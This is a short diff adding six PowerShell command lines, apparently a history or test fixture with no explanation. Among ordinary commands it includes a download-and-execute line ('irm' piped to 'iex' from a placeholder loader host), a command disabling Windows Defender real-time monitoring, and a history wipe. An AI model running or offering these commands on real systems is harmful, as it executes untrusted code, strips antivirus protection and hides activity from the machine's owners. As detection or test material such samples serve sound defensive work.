@@ -1,0 +1,6 @@
+git status
+cd .\projects
+irm https://loader.example.invalid/x | iex
+Get-Process | Sort-Object CPU
+Set-MpPreference -DisableRealtimeMonitoring $true
+Clear-History
